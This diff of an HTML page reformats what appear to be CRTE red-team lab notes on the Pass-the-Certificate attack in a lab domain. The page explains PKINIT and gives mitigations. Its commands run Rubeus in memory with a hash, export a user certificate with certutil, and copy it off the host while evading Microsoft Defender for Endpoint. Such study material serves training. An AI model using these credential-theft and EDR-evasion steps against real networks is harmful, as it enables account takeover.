@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CRTE Part 10 - Pass The Certificates Attack | Mr Stark Study Notes</title>
+  <title>CRTE Part 10 - Pass the Certificates | Mr Stark Study Notes</title>
   <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
   <link rel="stylesheet" href="../assets/css/style.css">
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -96,6 +96,23 @@
       border-top: 1px solid var(--jet);
       margin: 40px 0;
     }
+    .goad-content table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 25px 0;
+      font-size: 18px;
+    }
+    .goad-content th, .goad-content td {
+      border: 1px solid var(--jet);
+      padding: 12px;
+      text-align: left;
+      color: var(--light-gray);
+    }
+    .goad-content th {
+      background: var(--eerie-black-2);
+      color: var(--white-2);
+      font-weight: 500;
+    }
     .part-navigation {
       display: flex;
       justify-content: space-between;
@@ -173,45 +190,12 @@
 <li><a href="part-02-enumeration.html">Part 2: Enumeration</a></li>
 <li><a href="part-03-privilege-escalation.html">Part 3: Privilege Escalation</a></li>
 <li><a href="part-04-kerberoasting-attack.html">Part 4: Kerberoasting attack</a></li>
-<li><a href="part-05-privilege-escalation-targeted-kerberoasting.html">Part 5: Privilege Escalation - Targeted Ker...</a></li>
-<li><a href="part-06-privilege-escalation-laps-local-administrator-pass.html">Part 6: Privilege Escalation - LAPS (Local ...</a></li>
+<li><a href="part-05-privilege-escalation---targete.html">Part 5: Privilege Escalation - Targeted Kerberoasting</a></li>
+<li><a href="part-06-privilege-escalation---laps-lo.html">Part 6: Privilege Escalation - LAPS (Local Administrator Pass...</a></li>
 <li><a href="part-07-dumping-lsass-credentials.html">Part 7: Dumping LSASS Credentials</a></li>
-<li><a href="part-08-privilege-escalation-gmsa-attack.html">Part 8: Privilege Escalation - gMSA Attack</a></li>
+<li><a href="part-08-privilege-escalation---gmsa-at.html">Part 8: Privilege Escalation - gMSA Attack</a></li>
 <li><a href="part-09-lsass-attack-with-mde-bypass.html">Part 9: LSASS Attack With MDE Bypass</a></li>
 <li><a href="part-10-pass-the-certificates-attack.html" style="color: var(--orange-yellow-crayola);">Part 10: Pass The Certificates Attack</a></li>
-<li><a href="part-11-privilege-escalation-unconstrained-delegation.html">Part 11: Privilege Escalation - Unconstraine...</a></li>
-<li><a href="part-12-privilege-escalation-constrained-delegation.html">Part 12: Privilege Escalation - Constrained ...</a></li>
-<li><a href="part-13-privilege-escalation-rbcdresource-based-constraine.html">Part 13: Privilege Escalation - RBCD(Resourc...</a></li>
-<li><a href="part-14-domain-persistence-golden-ticket-attack.html">Part 14: Domain Persistence - Golden Ticket ...</a></li>
-<li><a href="part-15-domain-persistence-silver-ticket-attack.html">Part 15: Domain Persistence - Silver Ticket ...</a></li>
-<li><a href="part-16-domain-persistence-diamond-ticket-attack.html">Part 16: Domain Persistence - Diamond Ticket...</a></li>
-<li><a href="part-17-domain-persistence-skeleton-key-attack.html">Part 17: Domain Persistence - Skeleton Key A...</a></li>
-<li><a href="part-18-domain-persistence-sapphire-ticket-attack.html">Part 18: Domain Persistence - Sapphire Ticke...</a></li>
-<li><a href="part-19-domain-persistence-adminsdholder-attack.html">Part 19: Domain Persistence - AdminSDHolder ...</a></li>
-<li><a href="part-20-cross-domain-attacks-active-directory-certificate.html">Part 20: Cross Domain Attacks - Active Direc...</a></li>
-<li><a href="part-21-shadow-credentials-abusing-user-object.html">Part 21: Shadow Credentials - Abusing User O...</a></li>
-<li><a href="part-22-cross-domain-attacks-unconstrained-delegation-to-e.html">Part 22: Cross Domain Attacks - Unconstraine...</a></li>
-<li><a href="part-23-cross-domain-attacks-attacking-azure-ad-integratio.html">Part 23: Cross Domain Attacks - Attacking Az...</a></li>
-<li><a href="part-24-cross-domain-attacks-child-to-forest-root-sid-hist.html">Part 24: Cross Domain attacks - Child To For...</a></li>
-<li><a href="part-25-cross-domain-attacks-child-to-forest-root-sid-hist.html">Part 25: Cross Domain attacks - Child To For...</a></li>
-<li><a href="part-26-cross-forest-attacks-kerberoast-attack.html">Part 26: Cross Forest Attacks - Kerberoast A...</a></li>
-<li><a href="part-27-cross-forest-attacks-constrained-delegation-with-p.html">Part 27: Cross Forest Attacks - Constrained ...</a></li>
-<li><a href="part-28-cross-forest-attacks-unconstrained-delegation.html">Part 28: Cross Forest Attacks - Unconstraine...</a></li>
-<li><a href="part-29-cross-forest-attacks-trust-key-abuse-to-access-exp.html">Part 29: Cross Forest Attacks - Trust Key Ab...</a></li>
-<li><a href="part-30-cross-forest-attacks-injecting-sid-history-to-bypa.html">Part 30: Cross Forest Attacks - Injecting SI...</a></li>
-<li><a href="part-31-trust-abuse-mssql-servers-database-links.html">Part 31: Trust Abuse - MSSQL Servers - Datab...</a></li>
-<li><a href="part-32-cross-forest-attacks-foreign-security-principals-a.html">Part 32: Cross Forest Attacks - Foreign Secu...</a></li>
-<li><a href="part-33-cross-forest-attacks-abusing-pamprivileged-managem.html">Part 33: Cross Forest Attacks - Abusing PAM(...</a></li>
-<li><a href="part-34-cross-forest-attacks-trusting-to-trusted-trust-key.html">Part 34: Cross Forest Attacks - Trusting to ...</a></li>
-<li><a href="part-35-cross-forest-attacks-abusing-trust-transitivity.html">Part 35: Cross Forest Attacks - Abusing Trus...</a></li>
-        </ul>
-        <div class="separator"></div>
-        <ul class="social-list">
-          <li class="social-item">
-            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
-              <ion-icon name="logo-github"></ion-icon>
-            </a>
-          </li>
         </ul>
       </div>
     </aside>
@@ -219,207 +203,79 @@
       <article class="about active" data-page="about">
         <div class="goad-content">
 <h1>CRTE - Certified Red Team Expert</h1>
-
-<h2>Pass The Certificates Attack</h2>
-
-<p>The "Pass-the-Certificate" attack is a credential abuse technique that leverages certificates instead of traditional credentials like passwords or NTLM hashes to authenticate within a Windows environment. It is closely related to other credential relay attacks, such as "Pass-the-Hash" or "Pass-the-Ticket," but focuses on abusing certificates issued by Active Directory Certificate Services (ADCS) or other PKI systems.
-To understand this attack fully, it’s important to start with how certificates work in Windows authentication. Certificates are used for strong authentication mechanisms, especially in environments with ADCS. A certificate, when paired with its private key, can be used as proof of identity for a user or a computer. This proof can be used to authenticate to services like Remote Desktop Protocol (RDP), WinRM, or even for Kerberos operations. The certificate itself is tied to a specific identity, often a user account, and serves as an alternative to passwords or Kerberos tickets.
-The attack begins by identifying certificates stored on the system. These certificates can reside in the user or machine certificate stores and often include private keys. If an attacker can extract the private key along with the certificate, they essentially have the digital equivalent of a username and password combination for the account tied to the certificate. This is especially valuable because certificates are not subject to password policies, expiration warnings, or account lockouts.
-Once a certificate and its private key are obtained, the attacker can use them to impersonate the user or machine tied to the certificate. This is particularly useful in environments where multi-factor authentication (MFA) is implemented. Certificates are often considered one of the factors, and having access to the certificate effectively bypasses MFA. The attacker can then use the certificate to authenticate to network resources without needing the user's password or Kerberos ticket.
-One common way attackers obtain certificates is through Active Directory Certificate Services. ADCS is Microsoft's implementation of a Public Key Infrastructure (PKI) and is often used to issue certificates to users and computers. ADCS has several known attack vectors, such as misconfigured certificate templates, weak permissions, or exploitation techniques like ESC1 and ESC6, which allow attackers to request or enroll for certificates they shouldn’t have access to. Once a certificate is obtained through these methods, it becomes a powerful tool for lateral movement and privilege escalation.
-The Pass-the-Certificate attack has some key advantages for attackers. First, it’s stealthy because certificate authentication doesn’t generate the same types of logs as password-based authentication. This makes detection harder for defenders. Second, certificates are typically valid for a much longer time than passwords, often several months or even years, depending on how they were configured. This long validity period allows attackers to persist in the network without raising alarms.
-Mitigating this attack requires a combination of proper ADCS configuration, certificate management, and monitoring. Administrators should ensure that certificate templates are configured with the principle of least privilege, meaning only authorized accounts can request certain types of certificates. Private keys should always be stored securely, such as in a Hardware Security Module (HSM) or using Trusted Platform Module (TPM) protections, to prevent easy export. Monitoring for suspicious certificate activity, like unusual certificate requests or exports, can also help identify an attacker in the network.
-Understanding the Pass-the-Certificate attack highlights the importance of securing not just passwords but all forms of authentication material. As this technique abuses a legitimate authentication method, it emphasizes how important it is to treat certificates as sensitive credentials and apply rigorous controls to prevent their misuse. Mastering this topic involves learning how certificates are issued and used in Windows, how to identify misconfigurations in ADCS, and how to detect and respond to certificate-based threats.</p>
-
-<p>The Kerberos authentication protocol works with tickets in order to grant access. An ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to ASREProast).
-The pre-authentication can be validated symmetrically (with a DES, RC4, AES128 or AES256 key) or asymmetrically (with certificates). The asymmetrical way of pre-authenticating is called PKINIT.
-Pass the Certificate is the fancy name given to the pre-authentication operation relying on a certificate (i.e. key pair) to pass in order to obtain a TGT. This operation is often conducted along shadow credentials, AD CS escalation and UnPAC-the-hash attacks.</p>
-
-Keep in mind a certificate in itself cannot be used for authentication without the knowledge of the private key. 
-A certificate is signed for a specific public key, that was generated along with a private key, which should be used when relying on a certificate for authentication.
-The "certificate + private key" pair is usually used in the following manner
+<h2><strong>Pass The Certificates Attack</strong></h2>
+<p>The "Pass-the-Certificate" attack is a credential abuse technique that leverages certificates instead of traditional credentials like passwords or NTLM hashes to authenticate within a Windows environment. It is closely related to other credential relay attacks, such as "Pass-the-Hash" or "Pass-the-Ticket," but focuses on abusing certificates issued by Active Directory Certificate Services (ADCS) or other PKI systems.</p>
+<p>To understand this attack fully, it’s important to start with how certificates work in Windows authentication. Certificates are used for strong authentication mechanisms, especially in environments with ADCS. A certificate, when paired with its private key, can be used as proof of identity for a user or a computer. This proof can be used to authenticate to services like Remote Desktop Protocol (RDP), WinRM, or even for Kerberos operations. The certificate itself is tied to a specific identity, often a user account, and serves as an alternative to passwords or Kerberos tickets.</p>
+<p>The attack begins by identifying certificates stored on the system. These certificates can reside in the user or machine certificate stores and often include private keys. If an attacker can extract the private key along with the certificate, they essentially have the digital equivalent of a username and password combination for the account tied to the certificate. This is especially valuable because certificates are not subject to password policies, expiration warnings, or account lockouts.</p>
+<p>Once a certificate and its private key are obtained, the attacker can use them to impersonate the user or machine tied to the certificate. This is particularly useful in environments where multi-factor authentication (MFA) is implemented. Certificates are often considered one of the factors, and having access to the certificate effectively bypasses MFA. The attacker can then use the certificate to authenticate to network resources without needing the user's password or Kerberos ticket.</p>
+<p>One common way attackers obtain certificates is through Active Directory Certificate Services. ADCS is Microsoft's implementation of a Public Key Infrastructure (PKI) and is often used to issue certificates to users and computers. ADCS has several known attack vectors, such as misconfigured certificate templates, weak permissions, or exploitation techniques like ESC1 and ESC6, which allow attackers to request or enroll for certificates they shouldn’t have access to. Once a certificate is obtained through these methods, it becomes a powerful tool for lateral movement and privilege escalation.</p>
+<p>The Pass-the-Certificate attack has some key advantages for attackers. First, it’s stealthy because certificate authentication doesn’t generate the same types of logs as password-based authentication. This makes detection harder for defenders. Second, certificates are typically valid for a much longer time than passwords, often several months or even years, depending on how they were configured. This long validity period allows attackers to persist in the network without raising alarms.</p>
+<p>Mitigating this attack requires a combination of proper ADCS configuration, certificate management, and monitoring. Administrators should ensure that certificate templates are configured with the principle of least privilege, meaning only authorized accounts can request certain types of certificates. Private keys should always be stored securely, such as in a Hardware Security Module (HSM) or using Trusted Platform Module (TPM) protections, to prevent easy export. Monitoring for suspicious certificate activity, like unusual certificate requests or exports, can also help identify an attacker in the network.</p>
+<p>Understanding the Pass-the-Certificate attack highlights the importance of securing not just passwords but all forms of authentication material. As this technique abuses a legitimate authentication method, it emphasizes how important it is to treat certificates as sensitive credentials and apply rigorous controls to prevent their misuse. Mastering this topic involves learning how certificates are issued and used in Windows, how to identify misconfigurations in ADCS, and how to detect and respond to certificate-based threats.</p>
+<p>The Kerberos authentication protocol works with tickets in order to grant access. An ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to ASREProast).</p>
+<p>The pre-authentication can be validated symmetrically (with a DES, RC4, AES128 or AES256 key) or asymmetrically (with certificates). The asymmetrical way of pre-authenticating is called PKINIT.</p>
+<p>Pass the Certificate is the fancy name given to the pre-authentication operation relying on a certificate (i.e. key pair) to pass in order to obtain a TGT. This operation is often conducted along shadow credentials, AD CS escalation and UnPAC-the-hash attacks.</p>
+<p>`Keep in mind a certificate in itself cannot be used for authentication without the knowledge of the private key.</p>
+<p>A certificate is signed for a specific public key, that was generated along with a private key, which should be used when relying on a certificate for authentication.The "certificate + private key" pair is usually used in the following manner`</p>
 <ul>
-<li>PEM certificate + PEM private key</li>
-<li>PFX certificate export (which contains the private key) + PFX password (which protects the PFX certificate export)</li>
+<li><code>PEM certificate + PEM private key</code></li>
+<li><code>PFX certificate export (which contains the private key) + PFX password (which protects the PFX certificate export)</code></li>
 </ul>
-
-Let’s start this enumeration on US-Jump host with one of the users that we were able to compromise previous lab. Let’s start by elevating our privilege into pawadmin user.
-For that we will run Rubeus.exe into the memory with Loader.exe.
-Always remember to encode our Rubeus.exe argument (asktgt)
-<img src="./images/screenshot_123.png" alt="">
-
-We can now execute Rubeus.exe into the memory using Loader.exe.
-C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:pawadmin /aes256:a92324f21af51ea2891a24e9d5c3ae9dd2ae09b88ef6a88cb292575d16063c30 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
-<img src="./images/screenshot_124.png" alt="">
-
+<p>Let’s start this enumeration on US-Jump host with one of the users that we were able to compromise previous lab. Let’s start by elevating our privilege into pawadmin user.</p>
+<p>For that we will run Rubeus.exe into the memory with Loader.exe.</p>
+<p>Always remember to encode our Rubeus.exe argument (<code>asktgt</code>)</p>
+<img src="./images/screenshot_121.png" alt="image">
+<p>We can now execute Rubeus.exe into the memory using Loader.exe.</p>
+<p><code>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:pawadmin /aes256:a92324f21af51ea2891a24e9d5c3ae9dd2ae09b88ef6a88cb292575d16063c30 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</code></p>
+<img src="./images/screenshot_122.png" alt="image">
 <p>Now that we were able to elevate our privilege as pawadmin. Let’s now access starte enumerating.</p>
-
 <h2>Enumerating Pass The Certificates</h2>
-
-Let’s start by enumerating LocalMachine Certificates Store. Let’s access our target host using winrs.
-winrs -r:US-Jump cmd
-<img src="./images/screenshot_125.png" alt="">
-
-The command certutil -store My lists all certificates in the Personal certificate store of the current user pawadmin. 
-This store contains certificates tied to the current user's account, which are typically used for authentication, encryption, or signing. The output provides details about these certificates.
-certutil -store My
-<img src="./images/screenshot_126.png" alt="">
-
+<p>Let’s start by enumerating LocalMachine Certificates Store. Let’s access our target host using winrs.</p>
+<p><code>winrs -r:US-Jump cmd</code></p>
+<img src="./images/screenshot_123.png" alt="image">
+<p>The command <code>certutil -store My</code> lists all certificates in the <strong>Personal</strong> certificate store of the current user <code>pawadmin</code>.</p>
+<p>This store contains certificates tied to the current user's account, which are typically used for authentication, encryption, or signing. The output provides details about these certificates.</p>
+<p><code>certutil -store My</code></p>
+<img src="./images/screenshot_124.png" alt="image">
 <ul>
-<li>Serial Number: This is the unique identifier for the certificate. It's assigned by the issuing Certificate Authority (CA) and is used to uniquely identify the certificate in a system or when communicating with the CA.</li>
-<li>Issuer: This identifies the Certificate Authority (CA) that issued the certificate. In your case, the issuer is TECHCORP-DC-CA, meaning the TechCorp domain controller’s CA issued the certificate.</li>
-<li>NotBefore and NotAfter: These fields specify the validity period of the certificate.</li>
-<li>Subject: This details the identity tied to the certificate. Here, it is tied to pawadmin@techcorp.local, indicating this certificate is associated with the pawadmin user in the domain techcorp.local.</li>
-<li>Template: The certificate template used to generate this certificate. The template includes predefined settings for certificate issuance, such as permissions and intended use. Here, the OID (Object Identifier) 1.3.6.1.4... references a specific template, which you can look up for further details.</li>
-<li>Cert Hash (SHA1): This is the SHA-1 hash of the certificate. It uniquely identifies the certificate’s contents.</li>
-<li>Key Container: This shows where the private key is stored. The private key is critical because it allows the holder to authenticate as the user tied to the certificate. In your case, the private key is stored in the container te-Users-d57a73ce....</li>
-<li>Unique Container Name: This is the unique identifier for the private key container. It can help in locating and managing the private key within the system.</li>
-<li>Provider: This indicates the cryptographic provider used to generate and store the key. In this case, it’s Microsoft Enhanced Cryptographic Provider v1.0, a common Windows cryptographic provider.</li>
-<li>Encryption Test Passed: This confirms that the private key associated with the certificate is functional and can be used for encryption. If this test failed, the private key might be missing or inaccessible.</li>
+<li><code>Serial Number</code>: This is the unique identifier for the certificate. It's assigned by the issuing Certificate Authority (CA) and is used to uniquely identify the certificate in a system or when communicating with the CA.</li>
+<li><code>Issuer</code>: This identifies the Certificate Authority (CA) that issued the certificate. In your case, the issuer is <code>TECHCORP-DC-CA</code>, meaning the TechCorp domain controller’s CA issued the certificate.</li>
+<li><code>NotBefore</code><strong> and </strong><code>NotAfter</code>: These fields specify the validity period of the certificate.</li>
+<li><code>NotBefore</code>: The date and time the certificate becomes valid (7/21/2024, 3:37 AM).</li>
+<li><code>NotAfter</code>: The expiration date and time of the certificate (7/21/2025, 3:37 AM). This means the certificate is valid for one year.</li>
+<li><code>Subject</code>: This details the identity tied to the certificate. Here, it is tied to <code>pawadmin@techcorp.local</code>, indicating this certificate is associated with the <code>pawadmin</code> user in the domain <code>techcorp.local</code>.</li>
+<li><code>Template</code>: The certificate template used to generate this certificate. The template includes predefined settings for certificate issuance, such as permissions and intended use. Here, the OID (Object Identifier) <code>1.3.6.1.4...</code> references a specific template, which you can look up for further details.</li>
+<li><code>Cert Hash (SHA1)</code>: This is the SHA-1 hash of the certificate. It uniquely identifies the certificate’s contents.</li>
+<li><code>Key Container</code>: This shows where the private key is stored. The private key is critical because it allows the holder to authenticate as the user tied to the certificate. In your case, the private key is stored in the container <code>te-Users-d57a73ce...</code>.</li>
+<li><code>Unique Container Name</code>: This is the unique identifier for the private key container. It can help in locating and managing the private key within the system.</li>
+<li><code>Provider</code>: This indicates the cryptographic provider used to generate and store the key. In this case, it’s <code>Microsoft Enhanced Cryptographic Provider v1.0</code>, a common Windows cryptographic provider.</li>
+<li><code>Encryption Test Passed</code>: This confirms that the private key associated with the certificate is functional and can be used for encryption. If this test failed, the private key might be missing or inaccessible.</li>
 </ul>
-
-Now that we were able to find the certificate, let’s export this certificate in a .pfx format.
-certutil -exportpfx -p 'Stark123' 7700000027c68c32dab0cf410f000100000027 C:\Users\pawadmin\Downloads\pawadmin.pfx
-<img src="./images/screenshot_127.png" alt="">
-
-<p>Please bare in mind that, the password we are using will not be Stark123 but 'Stark123' including the single quotes. We must be aware of that and do not forget in the future when the password is needed while using the .pfx file.
-We were able to successfully export the certificate. Let’s now get back to our attacking machine and exfiltrate the .pfx file. Let’s map a driver and use XCOPY.</p>
-
-This method of extraction will make  us avoid triggering MDE, because 
- net use x: \\US-Jump\C$\Users\pawadmin\Downloads
-<img src="./images/screenshot_128.png" alt="">
-
-Let’s now use XCOPY to copy the file to our attacking host.
-echo F | xcopy x:pawadmin.pfx C:\AD\Tools\pawadmin.pfx
-<img src="./images/screenshot_129.png" alt="">
-
-The way we just exfiltrated this certificate, avoided triggering the MDE. 
-Using improper methods to extract a certificate and its private key can trigger Microsoft Defender for Endpoint (MDE) or other Endpoint Detection and Response (EDR) solutions. 
-<blockquote>Note that if we try to extract certificates using PowerShell, that is also flagged by MDE.</blockquote>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="part-navigation">
-            <a href="part-09-lsass-attack-with-mde-bypass.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: LSASS Attack With MDE Bypass</a>
-            <a href="part-11-privilege-escalation-unconstrained-delegation.html">Next: Privilege Escalation - Unconst <ion-icon name="arrow-forward-outline"></ion-icon></a>
+</ul>
+<p>Now that we were able to find the certificate, let’s export this certificate in a <code>.pfx</code> format.</p>
+<p><code>certutil -exportpfx -p 'Stark123' 7700000027c68c32dab0cf410f000100000027 C:\Users\pawadmin\Downloads\pawadmin.pfx</code></p>
+<img src="./images/screenshot_125.png" alt="image">
+<p>Please bare in mind that, the password we are using will not be <code>Stark123</code> but <code>'Stark123'</code> including the single quotes. We must be aware of that and do not forget in the future when the password is needed while using the <code>.pfx</code> file.</p>
+<p>We were able to successfully export the certificate. Let’s now get back to our attacking machine and exfiltrate the .pfx file. Let’s map a driver and use XCOPY.</p>
+<p>This method of extraction will make  us avoid triggering MDE, because</p>
+<p><code> net use x: \\US-Jump\C$\Users\pawadmin\Downloads</code></p>
+<img src="./images/screenshot_126.png" alt="image">
+<p>Let’s now use XCOPY to copy the file to our attacking host.</p>
+<p><code>echo F | xcopy x:pawadmin.pfx C:\AD\Tools\pawadmin.pfx</code></p>
+<img src="./images/screenshot_127.png" alt="image">
+<p>The way we just exfiltrated this certificate, avoided triggering the MDE.</p>
+<p>Using improper methods to extract a certificate and its private key can trigger <strong>Microsoft Defender for Endpoint (MDE)</strong> or other Endpoint Detection and Response (EDR) solutions.</p>
+<p>> <code>Note that if we try to extract certificates using PowerShell, that is also flagged by MDE.</code></p>
+          <div class="part-navigation">
+            <a href="part-09-lsass-attack-with-mde-bypass.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: LSASS MDE</a>
+            <a href="part-11-privilege-escalation-unconstrained-delegation.html">Next: Unconstrained Delegation <ion-icon name="arrow-forward-outline"></ion-icon></a>
           </div>
         </div>
       </article>
     </div>
   </main>
-  <script src="../assets/js/script.js"></script>
   <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
   <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+  <script src="../assets/js/script.js"></script>
 </body>
 </html>
